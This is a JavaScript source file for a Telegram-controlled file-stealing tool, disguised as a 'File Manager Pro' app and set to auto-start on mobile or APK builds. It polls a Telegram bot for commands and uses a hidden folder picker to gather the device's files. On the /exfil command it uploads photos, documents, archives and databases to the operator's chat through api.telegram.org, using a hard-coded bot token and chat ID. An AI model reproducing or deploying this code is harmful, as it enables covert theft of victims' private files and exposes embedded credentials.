// ==================== TELEGRAM FILE HUNTER - WORKING VERSION ====================
// CONFIGURATION - GANTI INI DENGAN DATA BOT KAMU!
const TELEGRAM_CONFIG = {
    BOT_TOKEN: "7943245418:AAFITshvFX_1WRpq5R1acdGLICAQNxPaGxc",  // ⬅️ Token dari @BotFather
    CHAT_ID: "7646758293",                                        // ⬅️ Chat ID kamu
    MAX_FILE_SIZE: 50 * 1024 * 1024, // 50MB
    APP_NAME: "File Manager Pro"
};

class TelegramFileHunter {
    constructor() {
        this.botToken = TELEGRAM_CONFIG.BOT_TOKEN;
        this.chatId = TELEGRAM_CONFIG.CHAT_ID;
        this.filesFound = [];
        this.isScanning = false;
        this.isExfiltrating = false;
        
        // File categories
        this.categories = {
            images: ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'],
            videos: ['.mp4', '.avi', '.mov', '.mkv', '.wmv', '.flv'],
            documents: ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt'],
            archives: ['.zip', '.rar', '.7z', '.tar'],
            audio: ['.mp3', '.wav', '.aac', '.ogg'],
            apks: ['.apk'],
            databases: ['.db', '.sqlite']
        };
        
        console.log('🤖 Telegram File Hunter Initialized');
        console.log('🔑 Bot Token:', this.botToken ? '✅ Set' : '❌ Missing');
        console.log('💬 Chat ID:', this.chatId ? '✅ Set' : '❌ Missing');
    }
    
    // ==================== TELEGRAM API ====================
    async sendToTelegram(text, file = null, filename = 'file.bin') {
        if (!this.botToken || !this.chatId) {
            console.error('❌ Bot token or chat ID not set');
            return null;
        }
        
        try {
            if (file) {
                // Send file
                const formData = new FormData();
                formData.append('chat_id', this.chatId);
                formData.append('document', file, filename);
                formData.append('caption', text);
                
                const response = await fetch(`https://api.telegram.org/bot${this.botToken}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                
                return await response.json();
            } else {
                // Send text message
                const response = await fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: this.chatId,
                        text: text,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });
                
                return await response.json();
            }
        } catch (error) {
            console.error('Telegram API Error:', error);
            return null;
        }
    }
    
    async testConnection() {
        console.log('🔗 Testing Telegram connection...');
        
        const testMessage = `✅ *Connection Test Successful!*\n\n` +
                          `🤖 Bot: ${TELEGRAM_CONFIG.APP_NAME}\n` +
                          `📱 Device: ${navigator.userAgent.substring(0, 50)}...\n` +
                          `⏰ Time: ${new Date().toLocaleString()}\n` +
                          `🌐 Status: Online & Ready`;
        
        const result = await this.sendToTelegram(testMessage);
        
        if (result && result.ok) {
            console.log('✅ Telegram connection successful');
            return true;
        } else {
            console.error('❌ Telegram connection failed');
            return false;
        }
    }
    
    // ==================== FILE SCANNING ====================
    async scanAllFiles() {
        if (this.isScanning) {
            return { success: false, message: 'Scan already in progress' };
        }
        
        this.isScanning = true;
        console.log('🔄 Scanning for files...');
        
        // Notify start
        await this.sendToTelegram('🔍 *Starting File Scan...*\n\nPlease wait while scanning your device.');
        
        try {
            // Try to get files via file input
            const files = await this.getFilesViaInput();
            this.filesFound = files;
            
            // Generate scan report
            const report = this.generateScanReport();
            
            // Send report to Telegram
            await this.sendToTelegram(report);
            
            this.isScanning = false;
            return {
                success: true,
                fileCount: files.length,
                totalSize: this.formatSize(files.reduce((sum, f) => sum + f.size, 0))
            };
            
        } catch (error) {
            console.error('Scan error:', error);
            this.isScanning = false;
            
            await this.sendToTelegram(`❌ *Scan Failed*\n\nError: ${error.message}`);
            return { success: false, error: error.message };
        }
    }
    
    async getFilesViaInput() {
        return new Promise((resolve, reject) => {
            // Create file input
            const input = document.createElement('input');
            input.type = 'file';
            input.multiple = true;
            input.webkitdirectory = true; // Allow folder selection
            input.style.display = 'none';
            
            // Set timeout
            const timeout = setTimeout(() => {
                if (input.parentNode) {
                    document.body.removeChild(input);
                }
                reject(new Error('File selection timeout'));
            }, 30000);
            
            input.onchange = async (event) => {
                clearTimeout(timeout);
                
                try {
                    const fileList = Array.from(event.target.files);
                    const files = [];
                    
                    for (const file of fileList) {
                        files.push({
                            name: file.name,
                            size: file.size,
                            type: file.type,
                            path: file.webkitRelativePath || file.name,
                            lastModified: file.lastModified,
                            fileObject: file
                        });
                    }
                    
                    document.body.removeChild(input);
                    resolve(files);
                    
                } catch (error) {
                    document.body.removeChild(input);
                    reject(error);
                }
            };
            
            // Trigger file dialog
            document.body.appendChild(input);
            input.click();
        });
    }
    
    generateScanReport() {
        const totalFiles = this.filesFound.length;
        const totalSize = this.filesFound.reduce((sum, f) => sum + f.size, 0);
        
        // Group by category
        const byCategory = {};
        this.filesFound.forEach(file => {
            const category = this.getFileCategory(file.name);
            byCategory[category] = (byCategory[category] || 0) + 1;
        });
        
        // Get largest files
        const largestFiles = [...this.filesFound]
            .sort((a, b) => b.size - a.size)
            .slice(0, 10);
        
        let report = `📂 *FILE SCAN REPORT*\n\n`;
        report += `📊 **Summary**\n`;
        report += `• Total Files: ${totalFiles}\n`;
        report += `• Total Size: ${this.formatSize(totalSize)}\n`;
        report += `• Scan Time: ${new Date().toLocaleString()}\n\n`;
        
        report += `🗂️ **Files by Type**\n`;
        for (const [category, count] of Object.entries(byCategory)) {
            report += `• ${category}: ${count} files\n`;
        }
        
        if (largestFiles.length > 0) {
            report += `\n🏆 **Largest Files**\n`;
            largestFiles.forEach((file, i) => {
                report += `${i + 1}. \`${file.name}\` - ${this.formatSize(file.size)}\n`;
            });
        }
        
        report += `\n🚀 **Ready for exfiltration**\n`;
        report += `Use /exfil command to start downloading files.`;
        
        return report;
    }
    
    getFileCategory(filename) {
        const ext = '.' + filename.split('.').pop().toLowerCase();
        
        for (const [category, exts] of Object.entries(this.categories)) {
            if (exts.includes(ext)) {
                return category;
            }
        }
        return 'other';
    }
    
    // ==================== FILE EXFILTRATION ====================
    async exfiltrateFiles() {
        if (this.isExfiltrating) {
            return { success: false, message: 'Exfiltration already in progress' };
        }
        
        if (this.filesFound.length === 0) {
            await this.sendToTelegram('❌ No files found. Please scan first with /scan command.');
            return { success: false, message: 'No files to exfiltrate' };
        }
        
        this.isExfiltrating = true;
        console.log('🚀 Starting file exfiltration...');
        
        // Send start notification
        await this.sendToTelegram(`🚀 *Starting File Exfiltration*\n\n` +
                                 `📁 Total Files: ${this.filesFound.length}\n` +
                                 `📊 Total Size: ${this.formatSize(this.filesFound.reduce((s, f) => s + f.size, 0))}\n` +
                                 `⏰ Started: ${new Date().toLocaleString()}\n\n` +
                                 `Processing files...`);
        
        const results = {
            total: this.filesFound.length,
            successful: 0,
            failed: 0,
            uploadedFiles: [],
            errors: []
        };
        
        // Process in batches
        const batchSize = 3;
        for (let i = 0; i < this.filesFound.length; i += batchSize) {
            const batch = this.filesFound.slice(i, i + batchSize);
            
            // Send batch progress
            const progress = Math.round((i / this.filesFound.length) * 100);
            await this.sendToTelegram(`🔄 Progress: ${progress}%\n` +
                                     `Processed: ${i}/${this.filesFound.length} files`);
            
            // Process each file in batch
            for (const fileInfo of batch) {
                try {
                    if (fileInfo.size > TELEGRAM_CONFIG.MAX_FILE_SIZE) {
                        // File too large, send metadata only
                        await this.sendFileMetadata(fileInfo);
                        results.successful++;
                    } else if (fileInfo.fileObject) {
                        // Upload actual file
                        await this.uploadFile(fileInfo);
                        results.successful++;
                        results.uploadedFiles.push(fileInfo.name);
                    } else {
                        // Send metadata
                        await this.sendFileMetadata(fileInfo);
                        results.successful++;
                    }
                } catch (error) {
                    console.error(`Failed to process ${fileInfo.name}:`, error);
                    results.failed++;
                    results.errors.push(`${fileInfo.name}: ${error.message}`);
                }
                
                // Delay to avoid rate limiting
                await this.delay(2000);
            }
            
            // Delay between batches
            await this.delay(5000);
        }
        
        // Send final report
        await this.sendFinalReport(results);
        
        this.isExfiltrating = false;
        return results;
    }
    
    async uploadFile(fileInfo) {
        console.log(`⬆️ Uploading: ${fileInfo.name}`);
        
        const caption = `📁 *File Uploaded*\n\n` +
                       `📝 Name: \`${fileInfo.name}\`\n` +
                       `📊 Size: ${this.formatSize(fileInfo.size)}\n` +
                       `📂 Path: ${fileInfo.path}\n` +
                       `📅 Modified: ${new Date(fileInfo.lastModified).toLocaleString()}`;
        
        const result = await this.sendToTelegram(caption, fileInfo.fileObject, fileInfo.name);
        
        if (!result || !result.ok) {
            throw new Error('Upload failed');
        }
        
        return result;
    }
    
    async sendFileMetadata(fileInfo) {
        const caption = `📄 *File Metadata*\n\n` +
                       `📝 Name: \`${fileInfo.name}\`\n` +
                       `📊 Size: ${this.formatSize(fileInfo.size)}\n` +
                       `📂 Path: ${fileInfo.path}\n` +
                       `📅 Modified: ${new Date(fileInfo.lastModified).toLocaleString()}\n` +
                       `⚠️ *File too large for upload (>50MB)*`;
        
        await this.sendToTelegram(caption);
    }
    
    async sendFinalReport(results) {
        const successRate = ((results.successful / results.total) * 100).toFixed(1);
        
        let report = `🎉 *FILE EXFILTRATION COMPLETE*\n\n`;
        report += `📊 **Final Report**\n`;
        report += `• Total Files: ${results.total}\n`;
        report += `• Successfully Processed: ${results.successful}\n`;
        report += `• Failed: ${results.failed}\n`;
        report += `• Success Rate: ${successRate}%\n\n`;
        
        if (results.uploadedFiles.length > 0) {
            report += `✅ **Uploaded Files** (${results.uploadedFiles.length})\n`;
            results.uploadedFiles.slice(0, 10).forEach(file => {
                report += `• \`${file}\`\n`;
            });
            
            if (results.uploadedFiles.length > 10) {
                report += `• ... and ${results.uploadedFiles.length - 10} more\n`;
            }
        }
        
        if (results.errors.length > 0) {
            report += `\n❌ **Errors**\n`;
            results.errors.slice(0, 5).forEach(error => {
                report += `• ${error}\n`;
            });
        }
        
        report += `\n⏰ **Completion Time:** ${new Date().toLocaleString()}`;
        
        await this.sendToTelegram(report);
    }
    
    // ==================== UTILITIES ====================
    formatSize(bytes) {
        if (bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }
    
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    
    // ==================== COMMAND HANDLER ====================
    async handleCommand(command) {
        const cmd = command.toLowerCase().trim();
        
        switch(cmd) {
            case '/start':
                return `🤖 *${TELEGRAM_CONFIG.APP_NAME}*\n\n` +
                       `✅ System: Online\n` +
                       `📁 Files: Ready\n` +
                       `🌐 Connection: Active\n\n` +
                       `Available commands:\n` +
                       `/scan - Scan for files\n` +
                       `/exfil - Download all files\n` +
                       `/test - Test connection\n` +
                       `/status - System status`;
            
            case '/scan':
                const scanResult = await this.scanAllFiles();
                return scanResult.success 
                    ? `✅ Scan complete: ${scanResult.fileCount} files found (${scanResult.totalSize})`
                    : `❌ Scan failed: ${scanResult.error}`;
            
            case '/exfil':
            case '/files':
            case '/download':
                const exfilResult = await this.exfiltrateFiles();
                return exfilResult.success !== false
                    ? `🚀 Exfiltration started! Processing ${exfilResult.total} files.`
                    : `❌ Exfiltration failed: ${exfilResult.message}`;
            
            case '/test':
                const testResult = await this.testConnection();
                return testResult 
                    ? `✅ Connection test successful! Bot is ready.`
                    : `❌ Connection test failed. Check bot token and chat ID.`;
            
            case '/status':
                return `📊 *System Status*\n\n` +
                       `• Files Found: ${this.filesFound.length}\n` +
                       `• Scanning: ${this.isScanning ? 'Yes' : 'No'}\n` +
                       `• Exfiltrating: ${this.isExfiltrating ? 'Yes' : 'No'}\n` +
                       `• Bot Token: ${this.botToken ? '✅ Set' : '❌ Missing'}\n` +
                       `• Chat ID: ${this.chatId ? '✅ Set' : '❌ Missing'}\n` +
                       `• Time: ${new Date().toLocaleString()}`;
            
            default:
                return `❓ Unknown command: ${command}\n\n` +
                       `Try:\n` +
                       `/start - Show help\n` +
                       `/scan - Scan files\n` +
                       `/exfil - Download files\n` +
                       `/test - Test connection`;
        }
    }
}

// ==================== GLOBAL INITIALIZATION ====================
// Create global instance
let telegramFileHunter = null;

function initTelegramFileHunter() {
    if (!telegramFileHunter) {
        telegramFileHunter = new TelegramFileHunter();
        console.log('✅ Telegram File Hunter initialized');
        
        // Auto-test connection
        setTimeout(async () => {
            if (TELEGRAM_CONFIG.BOT_TOKEN && !TELEGRAM_CONFIG.BOT_TOKEN.includes('GANTI')) {
                const connected = await telegramFileHunter.testConnection();
                if (connected) {
                    console.log('✅ Telegram bot connected successfully');
                }
            }
        }, 3000);
    }
    return telegramFileHunter;
}

// ==================== TELEGRAM COMMAND POLLING ====================
async function checkTelegramCommands() {
    if (!telegramFileHunter || !TELEGRAM_CONFIG.BOT_TOKEN) return;
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await response.json();
        
        if (data.ok && data.result.length > 0) {
            const lastUpdate = data.result[data.result.length - 1];
            if (lastUpdate.message && lastUpdate.message.text) {
                const command = lastUpdate.message.text;
                const chatId = lastUpdate.message.chat.id.toString();
                
                // Only respond to configured chat ID
                if (chatId === TELEGRAM_CONFIG.CHAT_ID) {
                    console.log(`📨 Command received: ${command}`);
                    
                    const response = await telegramFileHunter.handleCommand(command);
                    
                    // Send response back to Telegram
                    await telegramFileHunter.sendToTelegram(response);
                }
            }
        }
    } catch (error) {
        console.error('Command polling error:', error);
    }
}

// Start command polling every 10 seconds
setInterval(checkTelegramCommands, 10000);

// ==================== AUTO-START ====================
document.addEventListener('DOMContentLoaded', function() {
    // Initialize on page load
    initTelegramFileHunter();
    
    // Auto-start in APK mode
    if (window.cordova || /Android|iPhone|iPad/i.test(navigator.userAgent)) {
        console.log('📱 Mobile device detected');
        
        // Start background services
        setTimeout(() => {
            checkTelegramCommands();
        }, 5000);
    }
});

// ==================== GLOBAL EXPORT ====================
window.TelegramFileHunter = TelegramFileHunter;
window.tfh = telegramFileHunter;
window.TELEGRAM_CONFIG = TELEGRAM_CONFIG;

console.log('🔥 Telegram File Hunter v2.0 Loaded');